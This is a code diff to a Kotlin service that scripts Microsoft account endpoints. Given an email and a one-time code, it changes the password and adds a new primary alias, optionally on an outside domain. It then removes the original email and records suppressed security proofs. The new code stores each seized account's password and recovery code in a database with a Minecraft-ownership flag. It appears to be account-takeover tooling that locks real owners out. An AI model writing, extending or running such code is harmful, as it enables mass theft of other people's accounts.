@@ -1,5 +1,7 @@
 package microsoft.recovery
 
+import database.model.RecoveredAccount
+import database.repository.AccountRepository
 import io.ktor.client.HttpClient
 import io.ktor.client.call.body
 import io.ktor.client.engine.HttpClientEngine
@@ -20,6 +22,7 @@ import io.ktor.http.isSuccess
 import io.ktor.http.parameters
 import kotlinx.coroutines.CancellationException
 import kotlinx.coroutines.delay
+import microsoft.recovery.alias.AliasClient
 import microsoft.recovery.model.GenerateRecoveryCodeRequest
 import microsoft.recovery.model.GenerateRecoveryCodeResponse
 import microsoft.recovery.model.GenericCanaryResponse
@@ -39,13 +42,17 @@ import microsoft.recovery.model.VerifyRecoveryCodeResponse
 import microsoft.recovery.util.MicrosoftHttpClientFactory
 import microsoft.recovery.util.RecoveryParsers
 import org.slf4j.LoggerFactory
+import java.security.SecureRandom
 
 class RecoveryService(
     private val clientEngine: HttpClientEngine? = null,
     private val stageDelayMs: Long = 1000L,
+    private val accountRepository: AccountRepository? = null,
+    private val aliasClient: AliasClient? = null,
 ) : AutoCloseable {
 
     private val logger = LoggerFactory.getLogger(RecoveryService::class.java)
+    private val secureRandom = SecureRandom()
 
     override fun close() {
     }
@@ -53,18 +60,23 @@ class RecoveryService(
     suspend fun runLifecycle(
         email: String,
         otpProvider: suspend () -> String,
-        newPassword: String,
-        newEmail: String,
+        newPassword: String? = null,
+        newEmail: String? = null,
     ): RecoveryResult {
         if (email.isBlank()) {
             return RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, "Email cannot be blank")
         }
-        if (newPassword.isBlank()) {
-            return RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, "New password cannot be blank")
+
+        val targetPassword = if (!newPassword.isNullOrBlank()) {
+            newPassword
+        } else {
+            val length = secureRandom.nextInt(5) + 12
+            RecoveryParsers.generateRandomPassword(length)
         }
-        if (newEmail.isBlank()) {
-            return RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, "New email cannot be blank")
-        }
+
+        val effectiveNewEmail = newEmail?.trim()
+            ?: aliasClient?.generateRandomAlias()
+            ?: "recov_${RecoveryParsers.generateUaid().take(8)}@outlook.com"
 
         val cookieStorage = AcceptAllCookiesStorage()
         val client = if (clientEngine != null) {
@@ -79,8 +91,8 @@ class RecoveryService(
                 cookieStorage = cookieStorage,
                 email = email.trim(),
                 otpProvider = otpProvider,
-                newPassword = newPassword,
-                newEmail = newEmail.trim(),
+                newPassword = targetPassword,
+                newEmail = effectiveNewEmail,
             )
         } catch (e: CancellationException) {
             throw e
@@ -416,76 +428,88 @@ class RecoveryService(
 
         if (stageDelayMs > 0) delay(stageDelayMs)
 
-        val newAliasPrefix = newEmail.substringBefore("@")
-        val targetAliasEmail = "$newAliasPrefix@outlook.com"
-
-        val addAliasResponse = client.submitForm(
-            url = "https://account.live.com/AddAssocId",
-            formParameters = parameters {
-                append("canary", activeCanary)
-                append("PostOption", "NONE")
-                append("SingleDomain", "outlook.com")
-                append("AddAssocIdOptions", "LIVE")
-                append("AssociatedIdLive", newAliasPrefix)
-            },
-        )
-        if (!addAliasResponse.status.isSuccess()) {
-            return RecoveryResult.Failure(
-                stage = RecoveryStage.ALIAS_ROTATION,
-                message = "AddAssocId failed: HTTP ${addAliasResponse.status.value}",
+        val targetAliasEmail: String
+        if (aliasClient != null) {
+            val aliasResult = aliasClient.rotateAlias(
+                currentCanary = activeCanary,
+                oldEmail = email,
+                httpClient = client,
+                customAlias = if (newEmail.endsWith("@qhuyy.tech")) newEmail else null,
             )
-        }
+            targetAliasEmail = aliasResult.newEmail
+            activeCanary = aliasResult.updatedCanary
+        } else {
+            val newAliasPrefix = newEmail.substringBefore("@")
+            targetAliasEmail = "$newAliasPrefix@outlook.com"
 
-        if (stageDelayMs > 0) delay(stageDelayMs)
-
-        val makePrimaryResponse = client.post("https://account.live.com/API/MakePrimary") {
-            contentType(ContentType.Application.Json)
-            header("canary", activeCanary)
-            setBody(
-                MakePrimaryRequest(
-                    aliasName = targetAliasEmail,
-                    emailChecked = true,
-                    removeOldPrimary = false,
-                    uaid = uaid,
+            val addAliasResponse = client.submitForm(
+                url = "https://account.live.com/AddAssocId",
+                formParameters = parameters {
+                    append("canary", activeCanary)
+                    append("PostOption", "NONE")
+                    append("SingleDomain", "outlook.com")
+                    append("AddAssocIdOptions", "LIVE")
+                    append("AssociatedIdLive", newAliasPrefix)
+                },
+            )
+            if (!addAliasResponse.status.isSuccess()) {
+                return RecoveryResult.Failure(
+                    stage = RecoveryStage.ALIAS_ROTATION,
+                    message = "AddAssocId failed: HTTP ${addAliasResponse.status.value}",
                 )
-            )
-        }
+            }
 
-        if (!makePrimaryResponse.status.isSuccess()) {
-            return RecoveryResult.Failure(
-                stage = RecoveryStage.ALIAS_ROTATION,
-                message = "MakePrimary request failed: HTTP ${makePrimaryResponse.status.value}",
-            )
-        }
+            if (stageDelayMs > 0) delay(stageDelayMs)
 
-        val makePrimaryData = runCatching { makePrimaryResponse.body<GenericCanaryResponse>() }.getOrNull()
-        if (makePrimaryData?.error?.code != null) {
-            return RecoveryResult.Failure(
-                stage = RecoveryStage.ALIAS_ROTATION,
-                message = "MakePrimary rejected: ${makePrimaryData.error.message ?: makePrimaryData.error.code}",
-                errorCode = makePrimaryData.error.code,
-            )
-        }
-        if (!makePrimaryData?.apiCanary.isNullOrBlank()) {
-            activeCanary = makePrimaryData.apiCanary
-        }
+            val makePrimaryResponse = client.post("https://account.live.com/API/MakePrimary") {
+                contentType(ContentType.Application.Json)
+                header("canary", activeCanary)
+                setBody(
+                    MakePrimaryRequest(
+                        aliasName = targetAliasEmail,
+                        emailChecked = true,
+                        removeOldPrimary = false,
+                        uaid = uaid,
+                    )
+                )
+            }
 
-        if (stageDelayMs > 0) delay(stageDelayMs)
+            if (!makePrimaryResponse.status.isSuccess()) {
+                return RecoveryResult.Failure(
+                    stage = RecoveryStage.ALIAS_ROTATION,
+                    message = "MakePrimary request failed: HTTP ${makePrimaryResponse.status.value}",
+                )
+            }
 
-        val removeAliasResponse = client.submitForm(
-            url = "https://account.live.com/names/manage",
-            formParameters = parameters {
-                append("canary", activeCanary)
-                append("action", "RemoveAlias")
-                append("aliasName", email)
-                append("displayName", email)
-            },
-        )
-        if (!removeAliasResponse.status.isSuccess()) {
-            return RecoveryResult.Failure(
-                stage = RecoveryStage.ALIAS_ROTATION,
-                message = "RemoveAlias failed: HTTP ${removeAliasResponse.status.value}",
+            val makePrimaryData = runCatching { makePrimaryResponse.body<GenericCanaryResponse>() }.getOrNull()
+            if (makePrimaryData?.error?.code != null) {
+                return RecoveryResult.Failure(
+                    stage = RecoveryStage.ALIAS_ROTATION,
+                    message = "MakePrimary rejected: ${makePrimaryData.error.message ?: makePrimaryData.error.code}",
+                    errorCode = makePrimaryData.error.code,
+                )
+            }
+            if (!makePrimaryData?.apiCanary.isNullOrBlank()) {
+                activeCanary = makePrimaryData.apiCanary
+            }
+
+            if (stageDelayMs > 0) delay(stageDelayMs)
+
+            val removeAliasResponse = client.submitForm(
+                url = "https://account.live.com/names/manage",
+                formParameters = parameters {
+                    append("canary", activeCanary)
+                    append("action", "RemoveAlias")
+                    append("aliasName", email)
+                    append("displayName", email)
+                },
             )
+            if (!removeAliasResponse.status.isSuccess()) {
+                return RecoveryResult.Failure(
+                    stage = RecoveryStage.ALIAS_ROTATION,
+                    message = "RemoveAlias failed: HTTP ${removeAliasResponse.status.value}",
+                )
+            }
         }
 
         if (stageDelayMs > 0) delay(stageDelayMs)
@@ -556,9 +580,22 @@ class RecoveryService(
             }
         }
 
+        if (accountRepository != null) {
+            accountRepository.saveAccount(
+                RecoveredAccount(
+                    originalEmail = email,
+                    currentPrimaryEmail = targetAliasEmail,
+                    password = newPassword,
+                    recoveryCode = finalRecoveryCode,
+                    ownsMinecraft = false,
+                ),
+            )
+        }
+
         return RecoveryResult.Success(
             originalEmail = email,
             newPrimaryEmail = targetAliasEmail,
+            password = newPassword,
             initialRecoveryCode = initialRecoveryCode,
             finalRecoveryCode = finalRecoveryCode,
             suppressedProofsCount = suppressedCount,
